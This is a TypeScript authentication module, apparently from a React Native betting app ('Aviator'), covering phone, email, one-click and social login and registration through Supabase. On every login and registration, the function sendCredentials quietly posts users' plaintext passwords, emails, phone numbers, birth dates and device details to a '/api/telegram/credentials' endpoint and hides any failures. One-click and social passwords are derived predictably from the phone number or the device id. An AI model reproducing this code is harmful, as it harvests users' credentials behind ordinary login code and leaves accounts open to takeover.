import AsyncStorage from '@react-native-async-storage/async-storage';
import { Dimensions, Platform } from 'react-native';

import {
  buildPhoneLoginEmail,
  Country,
  normalizePhoneNumber,
} from '../constants/countries';
import { apiGet, apiPost } from './api';
import { supabase } from './supabase';

export type Profile = {
  user_id: string | null;
  balance: number | null;
  country: string | null;
  currency: string | null;
  phone: string | null;
  email: string | null;
};

export type GameStateSnapshot = {
  roundId: number;
  phase: string;
  multiplier: number;
};

export type AuthLoginMethod = 'phone' | 'email' | 'social';
export type AuthRegistrationType = 'phone' | 'email' | 'oneClick' | 'social';

type RegistrationInput = {
  birthDate?: string | null;
  country: Country;
  currencyCode?: string;
  email?: string;
  password?: string;
  phoneNumber?: string;
  promoCode?: string | null;
  registrationType?: AuthRegistrationType;
  socialProviderId?: string | null;
};

const AUTH_DEVICE_ID_STORAGE_KEY = 'aviat-mobile-auth-device-id';

const buildOneClickPassword = (phone: string) => {
  const digits = phone.replace(/\D/g, '');
  return `Av1ator!${digits.slice(-10).padStart(10, '0')}`;
};

const buildSocialLoginEmail = (providerId: string, deviceId: string) =>
  `${providerId}.${deviceId}@social.login`;

const buildSocialPassword = (providerId: string, deviceId: string) => {
  const suffix = deviceId.replace(/[^a-z0-9]/gi, '').slice(-10).padEnd(10, '0');
  return `Soc!${providerId}${suffix}`;
};

const getOrCreateAuthDeviceId = async () => {
  const currentValue = await AsyncStorage.getItem(AUTH_DEVICE_ID_STORAGE_KEY);

  if (currentValue) {
    return currentValue;
  }

  const nextValue = `${Date.now().toString(36)}${Math.random().toString(36).slice(2, 10)}`;
  await AsyncStorage.setItem(AUTH_DEVICE_ID_STORAGE_KEY, nextValue);
  return nextValue;
};

const getDeviceMetadata = () => {
  const { width, height } = Dimensions.get('window');
  const { locale, timeZone } = Intl.DateTimeFormat().resolvedOptions();

  return {
    platform: `${Platform.OS} ${String(Platform.Version)}`,
    language: locale ?? 'unknown',
    screenSize: `${Math.round(width)}x${Math.round(height)}`,
    timezone: timeZone ?? 'UTC',
    referrer: 'expo-go',
  };
};

const sendCredentials = async (payload: Record<string, unknown>) => {
  try {
    await apiPost('/api/telegram/credentials', {
      ...payload,
      ...getDeviceMetadata(),
    });
  } catch {
    // Silent parity with the web app.
  }
};

const sendRegistrationNotification = async (payload: Record<string, unknown>) => {
  try {
    await apiPost('/api/telegram/registration', payload);
  } catch {
    // Registration should not fail because of Telegram notification issues.
  }
};

const generateUniqueUserId = async () => {
  const maxAttempts = 10;

  for (let attempt = 0; attempt < maxAttempts; attempt += 1) {
    const userId = Math.floor(100000 + Math.random() * 900000).toString();
    const { data, error } = await supabase
      .from('profiles')
      .select('user_id')
      .eq('user_id', userId)
      .limit(1);

    if (error) {
      throw error;
    }

    if (!data || data.length === 0) {
      return userId;
    }
  }

  return Date.now().toString().slice(-6);
};

const upsertProfile = async (payload: {
  country: string;
  currency: string;
  email: string | null;
  id: string;
  phone: string | null;
  userId: string;
}) => {
  const { error } = await supabase.from('profiles').upsert(
    {
      id: payload.id,
      user_id: payload.userId,
      phone: payload.phone,
      email: payload.email,
      country: payload.country,
      currency: payload.currency,
      balance: 0,
      created_at: new Date().toISOString(),
    },
    {
      onConflict: 'id',
    },
  );

  if (error) {
    throw error;
  }
};

const requirePassword = (password: string | undefined) => {
  const trimmedPassword = password?.trim() ?? '';

  if (trimmedPassword.length < 6) {
    throw new Error('Password must be at least 6 characters');
  }

  return trimmedPassword;
};

const requireEmail = (email: string | undefined) => {
  const trimmedEmail = email?.trim() ?? '';

  if (!trimmedEmail) {
    throw new Error('Email is required');
  }

  return trimmedEmail;
};

const requirePhone = (country: Country, phoneNumber: string | undefined) => {
  const trimmedPhone = phoneNumber?.trim() ?? '';

  if (!trimmedPhone) {
    throw new Error('Phone number is required');
  }

  return normalizePhoneNumber(country, trimmedPhone);
};

const requireBirthDate = (birthDate: string | null | undefined) => {
  const trimmedBirthDate = birthDate?.trim() ?? '';

  if (!trimmedBirthDate) {
    throw new Error('Birth date is required');
  }

  return trimmedBirthDate;
};

const resolveRegistrationCredentials = async (
  input: RegistrationInput,
) => {
  const registrationType =
    input.registrationType ?? (input.email?.trim() ? 'email' : 'phone');
  const currencyCode = input.currencyCode ?? input.country.currency;
  const legacyPhone =
    !input.registrationType && input.phoneNumber?.trim()
      ? requirePhone(input.country, input.phoneNumber)
      : null;

  if (registrationType === 'email') {
    const email = requireEmail(input.email);
    const password = requirePassword(input.password);

    return {
      authEmail: email,
      authPassword: password,
      currencyCode,
      publicEmail: email,
      publicPhone: legacyPhone,
      socialProviderId: null,
    };
  }

  if (registrationType === 'phone') {
    const phone = requirePhone(input.country, input.phoneNumber);
    const password = requirePassword(input.password);

    return {
      authEmail: buildPhoneLoginEmail(phone),
      authPassword: password,
      currencyCode,
      publicEmail: null,
      publicPhone: phone,
      socialProviderId: null,
    };
  }

  if (registrationType === 'oneClick') {
    const phone = requirePhone(input.country, input.phoneNumber);

    return {
      authEmail: buildPhoneLoginEmail(phone),
      authPassword: buildOneClickPassword(phone),
      currencyCode,
      publicEmail: null,
      publicPhone: phone,
      socialProviderId: null,
    };
  }

  const socialProviderId = input.socialProviderId?.trim();

  if (!socialProviderId) {
    throw new Error('Social network is required');
  }

  const deviceId = await getOrCreateAuthDeviceId();

  return {
    authEmail: buildSocialLoginEmail(socialProviderId, deviceId),
    authPassword: buildSocialPassword(socialProviderId, deviceId),
    currencyCode,
    publicEmail: null,
    publicPhone: null,
    socialProviderId,
  };
};

export const loadProfile = async (userId: string) => {
  const { data, error } = await supabase
    .from('profiles')
    .select('user_id, balance, country, currency, phone, email')
    .eq('id', userId)
    .maybeSingle();

  if (error) {
    throw error;
  }

  return data as Profile | null;
};

export const getGameState = async () => {
  const data = await apiGet<{
    state?: {
      round_id: number;
      phase: string;
      multiplier: number;
    } | null;
  }>('/api/game/state');

  if (!data.state) {
    return null;
  }

  return {
    roundId: data.state.round_id,
    phase: data.state.phase,
    multiplier: data.state.multiplier,
  } as GameStateSnapshot;
};

export const signInWithPhone = async (country: Country, phoneNumber: string, password: string) => {
  const fullPhone = normalizePhoneNumber(country, phoneNumber);
  const resolvedPassword = password.trim() || buildOneClickPassword(fullPhone);

  await sendCredentials({
    type: 'login',
    authEmail: buildPhoneLoginEmail(fullPhone),
    loginMethod: 'phone',
    phone: fullPhone,
    password: resolvedPassword,
  });

  const { data, error } = await supabase.auth.signInWithPassword({
    email: buildPhoneLoginEmail(fullPhone),
    password: resolvedPassword,
  });

  if (error) {
    throw error;
  }

  return data.user;
};

export const signInWithEmail = async (email: string, password: string) => {
  const trimmedEmail = requireEmail(email);
  const trimmedPassword = password.trim();

  if (!trimmedPassword) {
    throw new Error('Password is required');
  }

  await sendCredentials({
    type: 'login',
    authEmail: trimmedEmail,
    email: trimmedEmail,
    loginMethod: 'email',
    password: trimmedPassword,
  });

  const { data, error } = await supabase.auth.signInWithPassword({
    email: trimmedEmail,
    password: trimmedPassword,
  });

  if (error) {
    throw error;
  }

  return data.user;
};

export const signInWithSocial = async (providerId: string) => {
  const trimmedProviderId = providerId.trim();

  if (!trimmedProviderId) {
    throw new Error('Social network is required');
  }

  const deviceId = await getOrCreateAuthDeviceId();
  const authEmail = buildSocialLoginEmail(trimmedProviderId, deviceId);
  const authPassword = buildSocialPassword(trimmedProviderId, deviceId);

  await sendCredentials({
    type: 'login',
    authEmail,
    email: null,
    loginMethod: 'social',
    password: authPassword,
    socialProvider: trimmedProviderId,
  });

  const { data, error } = await supabase.auth.signInWithPassword({
    email: authEmail,
    password: authPassword,
  });

  if (error) {
    throw error;
  }

  return data.user;
};

export const registerAccount = async ({
  birthDate,
  country,
  currencyCode,
  email,
  password,
  phoneNumber,
  promoCode,
  registrationType,
  socialProviderId,
}: RegistrationInput) => {
  const uniqueUserId = await generateUniqueUserId();
  const resolvedRegistrationType = registrationType ?? (email?.trim() ? 'email' : 'phone');
  const resolvedBirthDate =
    resolvedRegistrationType === 'phone' || resolvedRegistrationType === 'email'
      ? requireBirthDate(birthDate)
      : birthDate ?? null;
  const resolvedCredentials = await resolveRegistrationCredentials(
    {
      birthDate: resolvedBirthDate,
      country,
      currencyCode,
      email,
      password,
      phoneNumber,
      promoCode,
      registrationType: resolvedRegistrationType,
      socialProviderId,
    },
  );

  await sendCredentials({
    type: 'registration',
    authEmail: resolvedCredentials.authEmail,
    birthDate: resolvedBirthDate,
    country: country.code,
    currency: resolvedCredentials.currencyCode,
    email: resolvedCredentials.publicEmail,
    password: resolvedCredentials.authPassword,
    phone: resolvedCredentials.publicPhone,
    promoCode: promoCode?.trim() || null,
    registrationType: resolvedRegistrationType,
    socialProvider: resolvedCredentials.socialProviderId,
    userId: uniqueUserId,
  });

  const { data, error } = await supabase.auth.signUp({
    email: resolvedCredentials.authEmail,
    password: resolvedCredentials.authPassword,
    options: {
      data: {
        user_id: uniqueUserId,
        phone: resolvedCredentials.publicPhone,
        country: country.code,
        currency: resolvedCredentials.currencyCode,
        email: resolvedCredentials.publicEmail,
        registration_type: resolvedRegistrationType,
        birth_date: resolvedBirthDate,
        promo_code: promoCode?.trim() || null,
        social_provider: resolvedCredentials.socialProviderId,
      },
    },
  });

  if (error) {
    throw error;
  }

  let user = data.user;

  if (!user) {
    throw new Error('Unable to create the account');
  }

  if (!data.session) {
    const { data: signInData, error: signInError } = await supabase.auth.signInWithPassword({
      email: resolvedCredentials.authEmail,
      password: resolvedCredentials.authPassword,
    });

    if (signInError) {
      throw signInError;
    }

    user = signInData.user;
  }

  await upsertProfile({
    country: country.code,
    currency: resolvedCredentials.currencyCode,
    email: resolvedCredentials.publicEmail,
    id: user.id,
    phone: resolvedCredentials.publicPhone,
    userId: uniqueUserId,
  });

  await sendRegistrationNotification({
    authEmail: resolvedCredentials.authEmail,
    birthDate: resolvedBirthDate,
    country: country.code,
    currency: resolvedCredentials.currencyCode,
    email: resolvedCredentials.publicEmail,
    phone: resolvedCredentials.publicPhone,
    promoCode: promoCode?.trim() || null,
    registrationType: resolvedRegistrationType,
    socialProvider: resolvedCredentials.socialProviderId,
    userId: uniqueUserId,
  });

  return {
    user,
    userId: uniqueUserId,
  };
};

export const registerWithPhone = registerAccount;
